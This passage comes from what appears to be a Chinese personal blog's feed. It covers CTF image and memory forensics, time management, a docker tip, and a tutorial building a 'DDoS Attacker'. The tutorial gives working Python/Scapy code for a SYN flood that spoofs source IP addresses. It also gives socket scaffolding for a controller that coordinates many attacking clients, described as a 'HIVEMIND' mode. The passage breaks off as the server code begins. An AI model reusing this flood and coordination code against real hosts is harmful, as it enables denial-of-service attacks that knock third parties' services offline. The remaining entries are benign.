</p></blockquote><ul><li>IEND<br>图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。<strong>IEND 数据块的长度总是 00 00 00 00</strong>，<strong>数据标识总是 IEND 49 45 4E 44</strong>，因此，<strong>CRC 码也总是 AE 42 60 82</strong>。<br>🎯出题点：这些PNG图片固定的文件信息，一定要在分析图片时熟记，不用记住具体的值，但要对这些开始、结束等标志熟悉。有时在这些固定的信息附近，会有多余信息要去除。</li></ul></li></ul></li></ul><h3 id="图像深度"><a href="#图像深度" class="headerlink" title="图像深度"></a>图像深度</h3><p>PNG用来存储灰度图像时，灰度图像的深度可达16位，存储彩色图像时，彩色图像的深度可达48位，并且还可存储多达16位的α通道数据。图像深度信息保存在文件头数据块IHDR中。</p><h2 id="💡CTF-图片隐写题Tips"><a href="#💡CTF-图片隐写题Tips" class="headerlink" title="💡CTF 图片隐写题Tips"></a>💡CTF 图片隐写题Tips</h2><ol><li>Windows、Linux分别打开，看图片内容信息，将图片中的信息与题目、其他的hint写在一个文件里，做逻辑信息提炼、关联、整合</li><li>右键图片，查看图片信息，其中可能会有提示</li><li>英文搜索很重要，很多隐写技术还没有被“翻译”和应用</li></ol><h2 id="⌨内存取证其他调查"><a href="#⌨内存取证其他调查" class="headerlink" title="⌨内存取证其他调查"></a>⌨内存取证其他调查</h2><p>查看文档</p><figure class="highlight plain"><figcaption><span>-f xxx.raw --profile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看图片</span><br><span class="line">&#96;&#96;&#96;volatility -f xxx.raw --profile&#x3D;WinXPSP2x86 filescan | grep &quot;jpg\|jpeg\|png\|tif\|gif\|bmp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191115163811.png" alt="查看桌面"></p><p>查看桌面</p><figure class="highlight plain"><figcaption><span>-f xxx.raw --profile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看命令行输入</span><br><span class="line">&#96;&#96;&#96;volatility -f xxx.raw --profile&#x3D;WinXPSP2x86 cmdline</span><br></pre></td></tr></table></figure><p>查看系统用户名</p><figure class="highlight plain"><figcaption><span>-f xxx.raw --profile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看网络连接</span><br><span class="line">&#96;&#96;&#96;volatility -f mem.data --profile&#x3D;WinXPSP2x86 netscan</span><br></pre></td></tr></table></figure><h2 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h2><ol><li>熟悉使用各类取证分析工具，是快速解题的关键</li><li>参透出题人心理，猜测可能的flag位置</li><li>对Hint信息仔细观察并进行逻辑串联，不要忽视Hint中的部分信息</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://segmentfault.com/a/1190000018813033" target="_blank" rel="noopener">https://segmentfault.com/a/1190000018813033</a><br>[2] <a href="https://cloud.tencent.com/developer/article/1527140" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1527140</a><br>[3] <a href="https://www.cnblogs.com/WangAoBo/p/7108278.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7108278.html</a><br>[4] <a href="https://xz.aliyun.com/t/1836" target="_blank" rel="noopener">https://xz.aliyun.com/t/1836</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> DigtalForensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间管理</title>
      <link href="/2019/11/06//articles/2019/11/06/1573041978645.html/"/>
      <url>/2019/11/06//articles/2019/11/06/1573041978645.html/</url>
      
        <content type="html"><![CDATA[<h1 id="时间管理"><a href="#时间管理" class="headerlink" title="时间管理"></a>时间管理</h1><p>这是大三第一次大职规上，邱老师讲的时间管理的内容，做了一下笔记。感觉解答或者说是，呼吁了我一直以来对时间管理的问题和看法。受益匪浅，管理好时间，管理好自己，才能为这个世界做出一点改变，为我所爱的做出一点奉献。</p><h2 id="时间管理就是自我管理"><a href="#时间管理就是自我管理" class="headerlink" title="时间管理就是自我管理"></a>时间管理就是自我管理</h2><h2 id="时间管理的三大观念"><a href="#时间管理的三大观念" class="headerlink" title="时间管理的三大观念"></a>时间管理的三大观念</h2><ol><li>时间：花多少时间</li><li>效率：用多快速度</li><li>效能：走什么方向，走不走弯路</li></ol><h2 id="时间管理四象限法"><a href="#时间管理四象限法" class="headerlink" title="时间管理四象限法"></a>时间管理四象限法</h2><h3 id="1-紧急任务"><a href="#1-紧急任务" class="headerlink" title="1. 紧急任务"></a>1. 紧急任务</h3><p>不按期完成，它对你或者别人的价值会减少或者消失</p><h3 id="2-重要任务"><a href="#2-重要任务" class="headerlink" title="2. 重要任务"></a>2. 重要任务</h3><p>如果成功完成，你或别人将取得很大的收益。带来的收益越高，这项任务的重要程度越高。</p><h3 id="3-四象限"><a href="#3-四象限" class="headerlink" title="3. 四象限"></a>3. 四象限</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191106201246.png" alt="时间管理四象限"></p><p>Tips：<strong>优先处理重要的事情，而不是紧急的</strong>。选择重要，永远不会有错；选择紧急永远处理紧急，重要的事情解决完，就没有紧急的事情。</p><h2 id="节省时间的方法"><a href="#节省时间的方法" class="headerlink" title="节省时间的方法"></a>节省时间的方法</h2><ol><li>按优先级排序，从优先级最高的任务着手</li><li>和拖延做斗争，重要的事情，现在开始做</li><li>把大的、艰难的任务细分为细小的、容易的部分</li><li>为自己创造1小时的宁静，单线程时间，总结归纳（前一天晚上做）</li><li>适当的时候，说“不”</li><li>学会委托别人做事</li><li>归纳相似的事情，把它们放在一起处理</li><li>减少例行事务，缩短低价值的事情，委托别人完成，减少或推迟优先级很低的任务</li><li>避免完美主义。记住80/20定理（重要的事情80%时间完成，不重要的事情，20%时间完成）</li><li>避免做出过多的承诺。懂你的就懂，不懂的也没必要解释</li><li>不要把时间排得太满</li><li>要有预约的习惯。先和别人预约好，谈好，是为自己省时间</li></ol><p>💡Tips：恋爱观：两个人互相吸引的魅力持久存在，就是在于自我能力的提升，一起对未来有美好的期待。建议本科阶段多花点时间在一起提升自我的时间上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 感了个悟 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有趣的比喻</title>
      <link href="/2019/11/04//articles/2019/11/04/1572805876373.html/"/>
      <url>/2019/11/04//articles/2019/11/04/1572805876373.html/</url>
      
        <content type="html"><![CDATA[<h1 id="有趣的比喻"><a href="#有趣的比喻" class="headerlink" title="有趣的比喻"></a>有趣的比喻</h1><p>周日到周一的夜晚，总是比较晚才有睡意。<br>看到一个有趣的比喻，形容安全的学习：</p><ol><li>《CSAPP》、《算法导论》、《链接、装载与库》这些是九阳神功，是<strong>内功心法</strong></li><li>《白帽子讲web安全》、《0day安全》、《漏洞战争》、《Metasploit渗透测试魔鬼训练营》这些是独孤九剑，是<strong>招式剑法</strong></li><li>IDA、Nmap、Metasploit、DBG是玄铁重器，是<strong>兵器</strong></li></ol><p><strong>具有不同内功心法和招式剑法的人，拿到同样的兵器发挥出来的威力肯定不同</strong></p><p>需要注意的是，要注重理论学习——“九阳真经集融会贯通的武学至理，练成后天下武学皆附拾可用”。<br>招式剑法和兵器的使用，则要注重技巧与实战，以及心法和内功的运用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 感了个悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Tips】docker 进入容器</title>
      <link href="/2019/11/04//articles/2019/11/04/1572800228626.html/"/>
      <url>/2019/11/04//articles/2019/11/04/1572800228626.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>docker进入容器一般使用两种方式：</p><ol><li>attach</li><li>exec<br>推荐使用第二种，第一种exit后会stop容器，第二种则不会。<br>语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 第二种方式，进入bash</span><br><span class="line">docker exec -i xxx bash</span><br><span class="line"># 第一种方式</span><br><span class="line">docker attach xxx</span><br></pre></td></tr></table></figure>xxx代表容器名/ID</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS_Attacker_0.1</title>
      <link href="/2019/10/25//articles/2019/10/25/1572002541500.html/"/>
      <url>/2019/10/25//articles/2019/10/25/1572002541500.html/</url>
      
        <content type="html"><![CDATA[<h1 id="DDoS-Attacker-v0-1"><a href="#DDoS-Attacker-v0-1" class="headerlink" title="DDoS Attacker v0.1"></a>DDoS Attacker v0.1</h1><h2 id="仓库链接🔗"><a href="#仓库链接🔗" class="headerlink" title="仓库链接🔗"></a>仓库链接🔗</h2><p><a href="https://github.com/satan1a/DDoS_Attacket_v0.1" target="_blank" rel="noopener">To <del>~</del>GitHub</a></p><h2 id="仓库结构"><a href="#仓库结构" class="headerlink" title="仓库结构"></a>仓库结构</h2><ul><li>ddos_client_v0.1.py —— DDoS客户端</li><li>ddos_server_v0.1.py —— DDoS服务端</li><li>test/ —— 存放单独模块的测试脚本</li><li>drafts/ ——  存放实现过程中的“草稿”</li><li>refer/ —— 存放原作者参考的代码</li></ul><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>首先实现SYN泛洪攻击（SYN Flood，是一直常用的DOS方式之一，通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽的攻击方式）。TCP三次握手的过程在下面补充。SYN攻击则是<strong>客户端向服务器发送SYN报文之后就不再响应服务器回应的报文，由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，如果超过一定的时间没有接收到客户端的报文，那么本次连接在协议栈中存储的数据就会被丢弃。</strong> 攻击者如果利用这段时间发送了大量的连接请求，全部挂起在半连接状态，这样将不断消耗服务器资源，直到拒接服务。<br><img src="http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png" alt="SYN报文请求过程"><br>上图，就是SYN报文请求过程。SYN是TCP包的一个类型，表示建立连接。ACK表示响应。</p><h2 id="补充：TCP三次握手以及TCP-IP族相关"><a href="#补充：TCP三次握手以及TCP-IP族相关" class="headerlink" title="补充：TCP三次握手以及TCP/IP族相关"></a>补充：TCP三次握手以及TCP/IP族相关</h2><h3 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h3><p>TCP/IP是一个协议族。因为TCP/IP协议包括TCP、IP、UDP、ICMP、RIP、TELNETFTP、SMTP、ARP、TFTP等许多协议，这些协议一起称为TCP/IP协议。<br>其中TCP全称为Transport Control Protocol, 传输控制协议。位于OSI参考模型的第4层，传输层。下图为TCP/IP对应OSI中的层以及功能介绍：<br><img src="http://119.3.78.82:8085/uploads/big/611cbd062a697a303a79e36adfecc21d.png" alt="TCP/IP对应OSI中的层以及功能"></p><h3 id="三次“建立”四次“分手”"><a href="#三次“建立”四次“分手”" class="headerlink" title="三次“建立”四次“分手”"></a>三次“建立”四次“分手”</h3><p>接下来，我们讲回TCP协议，TCP需要三次握手才能建立，断开断开连接需要四次握手，过程如下：<br><img src="http://119.3.78.82:8085/uploads/big/9e0734662000d35db1c5e9bf19175183.gif" alt="TCP三次连接四次分手"></p><p>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接，以下详细的文字描述：</p><p> 位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p><p>第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</p><p> 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；</p><p> 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</p><p> 完成三次握手，主机A与主机B开始传送数据。</p><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Scapy是一个交互式数据包处理程序，可以用来发送、嗅探、解析和伪造网络数据包。本文环境为Ubuntu18.04LTS Desktop, VBox。可以使用apt或者pip安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># pip安装推荐推荐虚拟环境安装，安全也要讲究低耦合</span><br><span class="line">pip3 install scapy</span><br><span class="line"># 或者</span><br><span class="line">sudo apt-get install python-scapy</span><br><span class="line"># 运行scapy需要sudo权限</span><br><span class="line">sudo scapy</span><br><span class="line"># 运行会出现一些警告信息，先不用管</span><br></pre></td></tr></table></figure><h3 id="Tips-踩坑小提示："><a href="#Tips-踩坑小提示：" class="headerlink" title="Tips 踩坑小提示："></a>Tips 踩坑小提示：</h3><p>使用<code>sudo pip</code>安装，会安装到系统全局环境。如果我们激活虚拟环境后，再sudo pip，同样也会安装到系统全局环境，所以不要做按耳盗铃的事情哦~<br>但有时候，比如scapy，需要sudo权限执行，但<code>pip install scapy</code>安装后使用<code>sudo scapy</code>会显示command not found。但我们又不想把它安装到全局环境，那么解决办法是？</p><p>答案：sudo + 虚拟环境下的 bin/scapy。 e.g. <code>sudo ./venv/bin/scapy</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ ls</span><br><span class="line">activate      activate.fish  activate_this.py  easy_install      pip   pip3.6  python3    python-config  UTscapy</span><br><span class="line">activate.csh  activate.ps1   activate.xsh      easy_install-3.6  pip3  python  python3.6  scapy          wheel</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo scapy</span><br><span class="line">sudo: scapy: command not found</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy</span><br></pre></td></tr></table></figure><p>构造一个SYN包，发送测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个SYN包</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br></pre></td></tr></table></figure><p>发送测试，成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy </span><br><span class="line">INFO: Can&#39;t import matplotlib. Won&#39;t be able to plot.</span><br><span class="line">INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled WEP decryption&#x2F;encryption. (Dot11)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled IPsec encryption&#x2F;authentication.</span><br><span class="line">WARNING: IPython not available. Using standard Python shell instead.</span><br><span class="line">AutoCompletion, History are disabled.</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>但真的正确吗？<br>表面上看是成功了，但是这种方式就违背一条信息安全里很重要的原则：<strong>最小权限原则</strong>，即系统中所有的程序和特权用户应当仅获得完成相应工作所需的最少的权限。<br>使用上述的这种方式，我们使用sudo暂时向系统借了权限，执行虚拟环境里的程序，那么一个本来就要求更高权限的程序<strong>才能正常工作</strong>的程序，为什么要隔离在相对没有权限的环境里，然后又人为帮助它去翻过虚拟环境的高墙去做更高权限的事情呢？</p><h3 id="扩展：最小权限原则与sudo的使用"><a href="#扩展：最小权限原则与sudo的使用" class="headerlink" title="扩展：最小权限原则与sudo的使用"></a>扩展：最小权限原则与sudo的使用</h3><p>扩展：我们知道，sudo存在的一大目的，就是为了安全，尽可能地防止误操作和权限滥用。但同时我们也应该明白，什么时候需要给他较低权限，什么时候要给它较高权限，以及什么时候可以用sudo来暂时提高权限。<br>e.g. 在Ubuntu中，不是每个用户都可以使用sudo, 因为操作nginx等这种需要很高权限的服务时，只有指定的，<strong>被授予权限来暂时提高权限的用户</strong>才可以使用sudo来对nginx操作，这就是遵循了最小权限原则————权限最小，但能正常工作。<br>那么我们在虚拟环境下使用<code>pip install scapy</code>就违背了后者，不能正常工作。在这种情况下，root进不去虚拟环境，虚拟环境理论上又不能用sudo“越权”。所以，我们判断是否需要sudo安装的判断条件就是三个：  </p><ol><li>用户的权限最小化</li><li>程序能正常工作</li><li>如果同时满足的情况需要sudo，就可以直接使用sudo安装。</li></ol><h2 id="DDoS实现思路"><a href="#DDoS实现思路" class="headerlink" title="DDoS实现思路"></a>DDoS实现思路</h2><p>DDoS全称是Distributed Denial of Service，翻译成中文就是分布式拒绝服务，简单地说，就是调动多台主机一起发起攻击。<br>如何协同多台主机一起发起攻击呢？一种传统的方法就是控制多台傀儡机，同时进行SYN泛洪攻击，还有一种模式叫做HIVEMIND。  </p><blockquote><p>通过HIVEMIND模式，用户可以通过连接到一台 IRC(Internet Relay Chat services)服务器，当有用户发送命令，任何以HIVEMIND模式连接到IRC服务器的成员都会立即攻击该目标。  </p></blockquote><p>简单地说，一台主机可以作为Socket Server，其他主机作为Client，Client使用socket方式连接到Server，接收到信息后发起攻击。理想情况，就是志同道合的同志，可以随时加入攻击过程，只需执行客户端连接脚本即可开始攻击。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="实现一次SYN泛洪攻击"><a href="#实现一次SYN泛洪攻击" class="headerlink" title="实现一次SYN泛洪攻击"></a>实现一次SYN泛洪攻击</h3><p>具体步骤及介绍查看代码内注释，##注释内容为测试的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt, dport)</span>:</span></span><br><span class="line">    <span class="comment"># 伪造的源IP地址列表，同时也是保护攻击者的一种方式</span></span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="comment"># 从不同的源端口发送</span></span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>, <span class="number">65535</span>):</span><br><span class="line">        <span class="comment"># 随机选择主机地址</span></span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># 一个完整的TCP包由一个IP包和TCO包组成</span></span><br><span class="line">        <span class="comment"># 1. 构造IP包，设置源地址src和目的地址dst</span></span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        <span class="comment">## print("IP layer is " + str(ipLayer))</span></span><br><span class="line">        <span class="comment"># 2. 构造TCP包，设置发送源端口sport和目的源端口dport,flag值设为S表示发送SYN数据包</span></span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport = dport, flags=<span class="string">"S"</span>)</span><br><span class="line">        <span class="comment">## print("TCP layer is " + str(tcpLayer))</span></span><br><span class="line">        <span class="comment"># 3. 构造完整TCP包，IP包/TCP包</span></span><br><span class="line">        packet = ipLayer / tcpLayer</span><br><span class="line">        send(packet)</span><br><span class="line">        print(<span class="string">"Sent"</span>)</span><br><span class="line">        <span class="comment">## print(sPort)</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    synFlood(<span class="string">"192.168.50.10"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><h3 id="使用argparse命令行解析模块"><a href="#使用argparse命令行解析模块" class="headerlink" title="使用argparse命令行解析模块"></a>使用argparse命令行解析模块</h3><p>首先，我们需要命令行解析模块，对我们的命令行输入作处理。Scapy原本是一个命令行的模式，但我们不像每次攻击都手动输入一大堆命令吧，使用脚本会更加方便，所以我们需要argparse模块，对我们的命令行输入做处理，然后“发送”到Scapy中。</p><p>由于我们需要的是一对多模式（Server -&gt; Client），首先我们规定好命令行格式：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;</span></span><br></pre></td></tr></table></figure><p>接下来进行使用argparse的训练：<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入argparse模块</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="comment"># 新建一个ArgumentParser对象，description是对命令行解析的一个描述信息，通常在使用-h命令时显示</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">"Process some integers."</span>)</span><br><span class="line"><span class="comment"># 增加一个参数</span></span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>, dest=<span class="string">'port'</span>, type = int, help = <span class="string">'An port number!'</span>)</span><br><span class="line"><span class="comment"># 解析命令行输入</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(<span class="string">"Port: "</span>, args.port)</span><br></pre></td></tr></table></figure><p>实现效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python argparse_test.py -h</span><br><span class="line">usage: argparse_test.py [-h] [-p PORT]</span><br><span class="line"></span><br><span class="line">Process some integers.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -p PORT     An port number!</span><br><span class="line"></span><br><span class="line">$ sudo python argparse_test.py -p 123</span><br><span class="line">Port:  123</span><br></pre></td></tr></table></figure><h3 id="使用socket模块"><a href="#使用socket模块" class="headerlink" title="使用socket模块"></a>使用socket模块</h3><p>使用socket实现网络信息交换，从而实现服务器与客户端的信息通信。<br>使用socket需要指定IP地址、端口号、协议类型。<br>以下为客户端的实现代码： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 创建socket对象，AF_INET表示使用IPV4对象，SOCK_STREAM表示使用的是基于流</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'192.168.43.61'</span>, <span class="number">7786</span>))</span><br></pre></td></tr></table></figure><p>服务端代码：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器地址列表</span></span><br><span class="line">cliList = []</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定IP和端口，0.0.0.0表示绑定到所有的网络地址，但端口需要不被占用</span></span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">7786</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听器，设置最大连接数10</span></span><br><span class="line">s.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环等待新的连接，且将已连接的对象添加到列表中</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接受一个新的连接</span></span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    <span class="comment"># 添加新的连接到列表</span></span><br><span class="line">    cliList.append(sock)</span><br><span class="line">    <span class="comment">## 测试：显示已连接的客户机IP</span></span><br><span class="line">    <span class="keyword">for</span> client_ip <span class="keyword">in</span> cliList:</span><br><span class="line">        print(<span class="string">"Cliend IP: "</span> + str(client_ip))</span><br></pre></td></tr></table></figure><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h3><p>终于到攻击器的具体实现阶段啦，首先我们编写Server端代码。<br>具体的实现思路和流程，都写在代码内的注释中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span 